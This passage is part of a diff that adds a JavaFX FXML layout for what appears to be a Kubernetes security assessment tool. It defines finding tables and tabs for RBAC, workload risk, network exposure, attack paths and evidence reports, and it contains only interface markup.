+                                                        <TableColumn fx:id="advColRisk" text="Risk" prefWidth="80.0" />
+                                                        <TableColumn fx:id="advColModule" text="Module" prefWidth="160.0" />
+                                                        <TableColumn fx:id="advColTitle" text="Finding" prefWidth="260.0" />
+                                                        <TableColumn fx:id="advColResource" text="Resource" prefWidth="220.0" />
+                                                    </columns>
+                                                </TableView>
+                                                <TextArea fx:id="advSummaryOutput" prefRowCount="8" wrapText="false" styleClass="evidence-console" />
+                                            </children>
+                                            <padding><Insets bottom="6.0" left="6.0" right="6.0" top="6.0" /></padding>
+                                        </VBox>
+                                        <TabPane tabClosingPolicy="UNAVAILABLE">
+                                            <tabs>
+                                                <Tab text="Cluster Profile">
+                                                    <content>
+                                                        <TextArea fx:id="advClusterOutput" wrapText="false" styleClass="evidence-console" />
+                                                    </content>
+                                                </Tab>
+                                                <Tab text="Identity &amp; RBAC">
+                                                    <content>
+                                                        <TextArea fx:id="advIdentityOutput" wrapText="false" styleClass="evidence-console" />
+                                                    </content>
+                                                </Tab>
+                                                <Tab text="Workload Risk">
+                                                    <content>
+                                                        <TextArea fx:id="advWorkloadOutput" wrapText="false" styleClass="evidence-console" />
+                                                    </content>
+                                                </Tab>
+                                                <Tab text="Network Exposure">
+                                                    <content>
+                                                        <TextArea fx:id="advNetworkOutput" wrapText="false" styleClass="evidence-console" />
+                                                    </content>
+                                                </Tab>
+                                                <Tab text="Cloud Identity">
+                                                    <content>
+                                                        <TextArea fx:id="advCloudOutput" wrapText="false" styleClass="evidence-console" />
+                                                    </content>
+                                                </Tab>
+                                                <Tab text="Attack Paths">
+                                                    <content>
+                                                        <SplitPane dividerPositions="0.55">
+                                                            <items>
+                                                                <TextArea fx:id="advAttackPathOutput" wrapText="true" styleClass="evidence-console" />
+                                                                <TextArea fx:id="advGraphOutput" wrapText="false" styleClass="evidence-console" />
+                                                            </items>
+                                                        </SplitPane>
+                                                    </content>
+                                                </Tab>
+                                                <Tab text="Full Evidence Report">
+                                                    <content>
+                                                        <TextArea fx:id="advReportOutput" wrapText="false" styleClass="evidence-console" />
+                                                    </content>
+                                                </Tab>
+                                            </tabs>
+                                        </TabPane>
+                                    </items>
+                                </SplitPane>
+                            </children>
+                            <padding><Insets bottom="8.0" left="8.0" right="8.0" top="8.0" /></padding>
+                        </VBox>
+                    </content>
+                </Tab>
+
+                <Tab text="Operation Log">
+                    <content>
+                        <TextArea fx:id="logTextArea" wrapText="false" style="-fx-font-family: Consolas; -fx-font-size: 12;" />
+                    </content>
+                </Tab>
+            </tabs>
+        </TabPane>
+    </center>
+    <bottom>
+        <HBox alignment="CENTER_LEFT" spacing="10.0">
+            <children>
+                <Label fx:id="statusLabel" text="Ready" maxWidth="1.7976931348623157E308" HBox.hgrow="ALWAYS" />
+                <Label text="K8S-mythos-tool v1.0" />
+            </children>
+            <padding>
+                <Insets bottom="5.0" left="8.0" right="8.0" top="5.0" />
+            </padding>
+        </HBox>
+    </bottom>
+</BorderPane>
